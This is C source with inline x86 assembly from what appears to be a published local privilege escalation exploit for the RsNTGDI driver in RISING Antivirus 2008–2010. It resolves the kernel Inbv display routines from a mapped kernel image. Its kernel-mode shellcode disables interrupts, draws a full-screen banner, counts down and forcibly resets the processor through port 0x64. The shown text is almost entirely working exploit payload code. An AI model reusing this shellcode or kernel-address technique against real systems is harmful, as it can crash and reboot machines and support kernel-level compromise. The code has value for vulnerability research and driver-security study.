typedef VOID (*INBV_DISPLAY_STRING_FILTER)
(
    PUCHAR *String
);

VOID (__stdcall *InbvAcquireDisplayOwnership)
(
    VOID
);

VOID (__stdcall *InbvDisplayString)
(
    IN PCHAR String
);

VOID (__stdcall *InbvEnableDisplayString)
(
    IN BOOLEAN Enable
);

VOID (__stdcall *InbvInstallDisplayStringFilter)
(
    IN INBV_DISPLAY_STRING_FILTER Filter
);

VOID (__stdcall *InbvResetDisplay)
(
    VOID
);

VOID (__stdcall *InbvSetScrollRegion)
(
    IN ULONG Left,
    IN ULONG Top,
    IN ULONG Width,
    IN ULONG Height
);

VOID (__stdcall *InbvSetTextColor)
(
    IN ULONG Color
);

VOID (__stdcall *InbvSolidColorFill)
(
    IN ULONG Left,
    IN ULONG Top,
    IN ULONG Width,
    IN ULONG Height,
    IN ULONG Color
);

NTSTATUS XxInitInbv(IN ULONG ImageBase, IN ULONG MappedBase)
{
    NTSTATUS NtStatus;

    ANSI_STRING ProcedureName;


    //
    // InbvAcquireDisplayOwnership
    //

    RtlInitAnsiString(&ProcedureName, "InbvAcquireDisplayOwnership");

    NtStatus = LdrGetProcedureAddress(
                                      (PVOID)MappedBase,                     // DllHandle
                                      &ProcedureName,                        // ProcedureName
                                      0,                                     // ProcedureNumber OPTIONAL
                                      (PVOID*)&InbvAcquireDisplayOwnership); // ProcedureAddress

    if(NtStatus)
    {
        printf(" [*] NtStatus of LdrGetProcedureAddress - InbvAcquireDisplayOwnership - 0x%.8X\n", NtStatus);    
        return NtStatus;
    }

    (ULONG)InbvAcquireDisplayOwnership -= MappedBase;
    (ULONG)InbvAcquireDisplayOwnership += ImageBase;
    

    //
    // InbvResetDisplay
    //

    RtlInitAnsiString(&ProcedureName, "InbvResetDisplay");

    NtStatus = LdrGetProcedureAddress(
                                      (PVOID)MappedBase,
                                      &ProcedureName,
                                      0,
                                      (PVOID*)&InbvResetDisplay);

    if(NtStatus)
    {
        printf(" [*] NtStatus of LdrGetProcedureAddress - InbvResetDisplay - 0x%.8X\n", NtStatus);    
        return NtStatus;
    }

    (ULONG)InbvResetDisplay -= MappedBase;
    (ULONG)InbvResetDisplay += ImageBase;


    //
    // InbvSolidColorFill
    //

    RtlInitAnsiString(&ProcedureName, "InbvSolidColorFill");

    NtStatus = LdrGetProcedureAddress(
                                      (PVOID)MappedBase,
                                      &ProcedureName,
                                      0,
                                      (PVOID*)&InbvSolidColorFill);

    if(NtStatus)
    {
        printf(" [*] NtStatus of LdrGetProcedureAddress - InbvSolidColorFill - 0x%.8X\n", NtStatus);    
        return NtStatus;
    }

    (ULONG)InbvSolidColorFill -= MappedBase;
    (ULONG)InbvSolidColorFill += ImageBase;


    //
    // InbvSetTextColor
    //

    RtlInitAnsiString(&ProcedureName, "InbvSetTextColor");

    NtStatus = LdrGetProcedureAddress(
                                      (PVOID)MappedBase,
                                      &ProcedureName,
                                      0,
                                      (PVOID*)&InbvSetTextColor);

    if(NtStatus)
    {
        printf(" [*] NtStatus of LdrGetProcedureAddress - InbvSetTextColor - 0x%.8X\n", NtStatus);    
        return NtStatus;
    }

    (ULONG)InbvSetTextColor -= MappedBase;
    (ULONG)InbvSetTextColor += ImageBase;


    //
    // InbvInstallDisplayStringFilter
    //

    RtlInitAnsiString(&ProcedureName, "InbvInstallDisplayStringFilter");

    NtStatus = LdrGetProcedureAddress(
                                      (PVOID)MappedBase,
                                      &ProcedureName,
                                      0,
                                      (PVOID*)&InbvInstallDisplayStringFilter);

    if(NtStatus)
    {
        printf(" [*] NtStatus of LdrGetProcedureAddress - InbvInstallDisplayStringFilter - 0x%.8X\n", NtStatus);    
        return NtStatus;
    }

    (ULONG)InbvInstallDisplayStringFilter -= MappedBase;
    (ULONG)InbvInstallDisplayStringFilter += ImageBase;


    //
    // InbvEnableDisplayString
    //

    RtlInitAnsiString(&ProcedureName, "InbvEnableDisplayString");

    NtStatus = LdrGetProcedureAddress(
                                      (PVOID)MappedBase,
                                      &ProcedureName,
                                      0,
                                      (PVOID*)&InbvEnableDisplayString);

    if(NtStatus)
    {
        printf(" [*] NtStatus of LdrGetProcedureAddress - InbvEnableDisplayString - 0x%.8X\n", NtStatus);    
        return NtStatus;
    }

    (ULONG)InbvEnableDisplayString -= MappedBase;
    (ULONG)InbvEnableDisplayString += ImageBase;


    //
    // InbvSetScrollRegion
    //

    RtlInitAnsiString(&ProcedureName, "InbvSetScrollRegion");

    NtStatus = LdrGetProcedureAddress(
                                      (PVOID)MappedBase,
                                      &ProcedureName,
                                      0,
                                      (PVOID*)&InbvSetScrollRegion);

    if(NtStatus)
    {
        printf(" [*] NtStatus of LdrGetProcedureAddress - InbvSetScrollRegion - 0x%.8X\n", NtStatus);    
        return NtStatus;
    }

    (ULONG)InbvSetScrollRegion -= MappedBase;
    (ULONG)InbvSetScrollRegion += ImageBase;


    //
    // InbvDisplayString
    //

    RtlInitAnsiString(&ProcedureName, "InbvDisplayString");

    NtStatus = LdrGetProcedureAddress(
                                      (PVOID)MappedBase,
                                      &ProcedureName,
                                      0,
                                      (PVOID*)&InbvDisplayString);

    if(NtStatus)
    {
        printf(" [*] NtStatus of LdrGetProcedureAddress - InbvDisplayString - 0x%.8X\n", NtStatus);    
        return NtStatus;
    }

    (ULONG)InbvDisplayString -= MappedBase;
    (ULONG)InbvDisplayString += ImageBase;


    printf(" +----------------------------------------------------------------------------+\n"
           " | InbvAcquireDisplayOwnership - 0x%.8X                                   |\n"
           " | InbvResetDisplay - 0x%.8X                                              |\n"
           " | InbvSolidColorFill - 0x%.8X                                            |\n"
           " | InbvSetTextColor - 0x%.8X                                              |\n"
           " | InbvInstallDisplayStringFilter - 0x%.8X                                |\n"
           " | InbvEnableDisplayString - 0x%.8X                                       |\n"
           " | InbvSetScrollRegion - 0x%.8X                                           |\n"
           " | InbvDisplayString - 0x%.8X                                             |\n"
           " +----------------------------------------------------------------------------+\n\n",
           InbvAcquireDisplayOwnership,
           InbvResetDisplay,
           InbvSolidColorFill,
           InbvSetTextColor,
           InbvInstallDisplayStringFilter,
           InbvEnableDisplayString,
           InbvSetScrollRegion,
           InbvDisplayString);

    RtlFreeAnsiString(&ProcedureName);

    return STATUS_SUCCESS;
}

UCHAR BugCheck01[] = " 3";
UCHAR BugCheck02[] = " 2";
UCHAR BugCheck03[] = " 1";
UCHAR BugCheck04[] = " Rebooting ...";
UCHAR BugCheckString[] =
    "                                                                                "
    " Beijing Rising International Software Co.,Ltd.                                 "
    " http://www.rising-global.com/                                                  "
    "                                                                                "
    " Affected Software:                                                             "
    " RISING Antivirus 2008/2009/2010                                                "
    "                                                                                "
    " Affected Driver:                                                               "
    " RsNTGDI - RsNTGdi.sys                                                          "
    "                                                                                "
    " Local Privilege Escalation Exploit                                             "
    " For Educational Purposes Only !                                                "
    "                                                                                "
    "                                                                                "
    " NT Internals - http://www.ntinternals.org/                                     "
    " alex ntinternals org                                                           "
    " 28 January 2010                                                                "
    "                                                                                "
    " References:                                                                    "
	" RISING Antivirus 2008/2009/2010 Privilege Escalation Vulnerability             "
	" http://www.ntinternals.org/ntiadv0902/ntiadv0902.html                          "
	"                                                                                "
    " Exploiting Common Flaws in Drivers                                             "
    " Ruben Santamarta - http://www.reversemode.com/                                 "
    "                                                                                "
    "                                                                                ";

VOID InbvShellCode()
{
    __asm
    {
        //
        // KeDisableInterrupts
        //
        pushf
        pop eax
        and eax, 0x0200
        shr eax, 0x09
        cli
        
        //
        // Prepareing Screen
        //
        call InbvAcquireDisplayOwnership
        
        call InbvResetDisplay
  
        sub esi, esi
        push 0x04
        mov edi, 0x01DF
        push edi
        mov ebx, 0x027F
        push ebx
        push esi
        push esi
        call InbvSolidColorFill    
        
        push 0x0F
        call InbvSetTextColor
        
        push esi
        call InbvInstallDisplayStringFilter
        
        inc esi
        push esi
        call InbvEnableDisplayString
        
        dec edi
        dec edi
        push edi
        push ebx
        dec esi
        push esi
        push esi
        call InbvSetScrollRegion
        
        lea eax, BugCheckString
        push eax
        call InbvDisplayString
            
        mov esi, 0x80000000
        mov ecx, esi
        
        //
        // Countdown
        //
    __loop01:
        dec ecx
        jnz __loop01
        
        lea eax, BugCheck01
        push eax
        call InbvDisplayString

        mov ecx, esi

    __loop02:
        dec ecx
        jnz __loop02

        lea eax, BugCheck02
        push eax
        call InbvDisplayString

        mov ecx, esi

    __loop03:
        dec ecx
        jnz __loop03

        lea eax, BugCheck03
        push eax
        call InbvDisplayString

        mov ecx, esi

    __loop04:
        dec ecx
        jnz __loop04

        lea eax, BugCheck04
        push eax
        call InbvDisplayString

        mov ecx, esi
        shl ecx, 0x01

    __loop05:
        dec ecx
        jnz __loop05
        
        //
        // Reseting Processor
        //
        mov al, 0xFE
        out 0x64, al
    }
}